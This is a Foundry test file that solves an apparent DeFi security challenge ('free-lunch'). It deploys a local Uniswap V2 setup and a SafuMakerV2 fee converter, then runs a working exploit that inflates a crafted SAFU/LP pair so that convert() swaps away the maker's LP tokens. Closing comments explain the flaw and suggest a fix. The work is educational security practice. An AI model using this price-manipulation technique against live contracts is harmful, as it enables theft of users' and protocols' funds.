// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import {Token} from "src/other/Token.sol";
import {SafuMakerV2} from "src/free-lunch/SafuMakerV2.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    IUniswapV2Factory safuFactory;
    IUniswapV2Router02 safuRouter;
    IUniswapV2Pair safuPair; // USDC-SAFU trading pair
    IWETH weth;
    Token usdc;
    Token safu;
    SafuMakerV2 safuMaker;
    address[] public path;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token("USDC", "USDC");

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = admin;
        addresses[1] = attacker;
        amounts[0] = 1_000_000e18;
        amounts[1] = 100e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        vm.prank(admin);
        safu = new Token("SAFU", "SAFU");

        addresses[0] = admin;
        addresses[1] = attacker;
        amounts[0] = 1_000_000e18;
        amounts[1] = 100e18;
        vm.prank(admin);
        safu.mintPerUser(addresses, amounts);

        // deploying SafuSwap + SafuMaker contracts
        weth = IWETH(deployCode("src/other/uniswap-build/WETH9.json"));
        safuFactory = IUniswapV2Factory(deployCode("src/other/uniswap-build/UniswapV2Factory.json", abi.encode(admin)));
        safuRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json", abi.encode(address(safuFactory), address(weth))
            )
        );

        vm.prank(admin);
        safuMaker = new SafuMakerV2(
            address(safuFactory),
            0x1111111111111111111111111111111111111111, // sushiBar address, irrelevant for exploit
            address(safu),
            address(usdc)
        );
        vm.prank(admin);
        safuFactory.setFeeTo(address(safuMaker));

        // --adding initial liquidity
        vm.prank(admin);
        usdc.approve(address(safuRouter), type(uint256).max);
        vm.prank(admin);
        safu.approve(address(safuRouter), type(uint256).max);

        vm.prank(admin);
        safuRouter.addLiquidity(address(usdc), address(safu), 1_000_000e18, 1_000_000e18, 0, 0, admin, block.timestamp);

        // --getting the USDC-SAFU trading pair
        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc), address(safu)));

        // --simulates trading activity, as LP is issued to feeTo address for trading rewards
        vm.prank(admin);
        safuPair.transfer(address(safuMaker), 10_000e18); // 1% of LP
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        address lp2 = safuFactory.createPair(address(safu), address(safuPair));
        safu.approve(address(safuRouter), type(uint256).max);
        usdc.approve(address(safuRouter), type(uint256).max);
        safuRouter.addLiquidity(address(safu), address(usdc), 1e18, 1e18, 0, 0, attacker, block.timestamp + 100);
        safuPair.approve(address(safuRouter), type(uint256).max);

        safuRouter.addLiquidity(address(safu), address(safuPair), 1e15, 1e18, 0, 0, attacker, block.timestamp + 100);
        IUniswapV2Pair(lp2).transfer(address(safuMaker), IUniswapV2Pair(lp2).balanceOf(attacker));

        safuMaker.convert(address(safu), address(safuPair));

        safu.approve(address(lp2), type(uint256).max);

        path.push(address(safu));
        path.push(address(safuPair));

        safuRouter.swapTokensForExactTokens(10000e18, safu.balanceOf(attacker), path, attacker, block.timestamp + 100);
        safuRouter.removeLiquidity(address(usdc), address(safu), 10000e18, 0, 0, attacker, block.timestamp + 100);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker has increased both SAFU and USDC funds by at least 50x
        assertGe(usdc.balanceOf(attacker), 5_000e18);
        assertGe(safu.balanceOf(attacker), 5_000e18);
    }
}

// the vulnerability in this contract was logical.
// when converting tokens, contract should have converted only the amount it got from burning lp tokens , not all the tokens in the contract
// in this case it was possible to create new pair of (usdc-safu)-safu and inflate the price of safu
// as a result contract swapped all of its lp tokens for couple of safu tokens
// lp tokens were later exchanged for the underlying assets on dex

// Recommendation: remove lines 97-98 and calculate the difference in tokens amount on contract balance before and after burn and convert that amount
